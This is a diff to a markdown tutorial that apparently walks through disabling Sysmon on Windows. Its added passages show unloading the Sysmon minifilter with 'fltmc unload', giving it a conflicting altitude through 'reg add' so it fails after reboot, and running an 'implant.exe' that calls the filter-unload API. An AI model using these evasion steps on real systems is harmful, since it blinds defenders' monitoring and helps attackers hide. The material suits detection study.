@@ -1877,6 +1877,14 @@ This command outputs comprehensive information including:
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters"
 ```
 
+<img width="1225" height="641" alt="image" src="https://github.com/user-attachments/assets/a53c0046-32d5-431b-8a34-252ba5575a57" />
+
+```cmd
+
+```
+
+<img width="1283" height="629" alt="image" src="https://github.com/user-attachments/assets/981f874b-c790-4581-9c0b-3c05582768a5" />
+
 **Expected Output:**
 ```
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ofltdrv\Parameters
@@ -1990,11 +1998,28 @@ Create a configuration file that excludes most monitoring:
 #### Manual Method using FLTMC
 ```cmd
 # List all minifilter drivers
-fltmc instances
+fltmc
 
+```cmd
+# or by using
+fltmc instances
+```
+
+<img width="1288" height="646" alt="image" src="https://github.com/user-attachments/assets/77b131b0-18e0-4f5d-9504-f1a3a13d698a" />
+
+<img width="1284" height="667" alt="image" src="https://github.com/user-attachments/assets/380927da-8f7b-4bf8-a778-75eb3b4bf0e3" />
+
+```cmd
 # Unload Sysmon driver (using driver name from registry query)
 fltmc unload ofltdrv
 ```
+
+So the only thing you need is the name of the driver and you can unload that. But we can use our code from `implant.cpp`, which does exactly the same. And this code is super simple because there is only one call you have to do. It's a filter unload function with the name of the driver. And with that, the driver gets unloaded from the kernel space. 
+
+The only thing you need, apart from high privileges, you have to enable load driver privilege. It's not on by default in processes, so `setPrivilege` function does that.
+
+<img width="1678" height="815" alt="image" src="https://github.com/user-attachments/assets/e11dff9c-2ca3-4c4c-b475-bffd7e555eb1" />
+
 
 #### Programmatic Method
 The provided C++ code uses the Filter Management API to unload the Sysmon driver:
@@ -2090,8 +2115,10 @@ logman query providers | findstr "1DRV"
 
 #### Check DNS Client Provider
 ```cmd
-logman query providers "Microsoft-Windows-DNS-Client"
+logman query providers microsoft-windows-dns-client
 ```
+
+<img width="1288" height="651" alt="image" src="https://github.com/user-attachments/assets/5091fd63-57f2-42fd-875f-c53b86885116" />
 
 The Sysmon service remains registered to the DNS client ETW provider, so DNS queries continue to be logged even after the minifilter is unloaded.
 
@@ -2112,9 +2139,30 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Insta
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude /t REG_SZ /d 320832 /f
 
 # Revert to original altitude
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude /t REG_SZ /d 385201 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\ofltdrv\Instances\Sysmon Instance" /v Altitude /t REG_SZ /d 320833 /f
 ```
 
+<img width="1233" height="647" alt="image" src="https://github.com/user-attachments/assets/1aa4a767-e10e-4cac-9ca6-782d6f510e17" />
+
+
+Now our Sysmon has the same altitude as Bitdefender driver:
+
+<img width="1226" height="643" alt="image" src="https://github.com/user-attachments/assets/f4a13be3-d238-4605-9c71-c437a73a2acc" />
+
+
+Now, to make it effective, the machine has to be rebooted.
+
+
+After reboot, let's check event viewer, and there is no Sysmon:
+
+<img width="1235" height="627" alt="image" src="https://github.com/user-attachments/assets/6198ed70-a92f-4e7c-b227-5b9bf2537b7e" />
+
+
+Let's check the logs, and we have another error. So again, DNS queries are still being logged because of the separate ETW provider. The error log is telling us that failed to access the driver that kills the kernel portion of Sysmon. So that's another way you can use to get rid of Sysmon:
+
+<img width="1609" height="804" alt="image" src="https://github.com/user-attachments/assets/93e54f00-757d-48d1-9e0b-cdf0e6257f1f" />
+
+ 
 #### Effects of Altitude Conflict
 - Sysmon driver fails to load during system startup
 - Kernel monitoring is completely disabled
@@ -2133,6 +2181,11 @@ cl implant.cpp
 ```cmd
 implant.exe
 ```
+
+And now the driver is gone:
+
+<img width="1286" height="645" alt="image" src="https://github.com/user-attachments/assets/f5e3da85-879c-4db6-ac9d-de4ce73dc4ce" />
+
 
 ## Complete Attack Flow Example
 
@@ -2158,6 +2211,13 @@ implant.exe
 6. **Verification**:
    - Check `fltmc instances` for driver status
    - Monitor Event Viewer for error logs
+  
+     If we look at the Sysmon logs, now you can see that there is an error stating that, yeah, we couldn't retrieve events.
+
+     <img width="1683" height="821" alt="image" src="https://github.com/user-attachments/assets/1ec47701-df4a-497b-83f2-8b7029b32d00" />
+
+     But as you can see, there was something else logged. So unloading minifilter from the kernel doesn't stop logging done by the service. And particularly, DNS query events are being logged because Sysmon also uses ETW provider, which is Microsoft Windows DNS client. And these events are still being pushed to Sysmon service, and this lands in this log.
+
 
 ## Technical Details
 
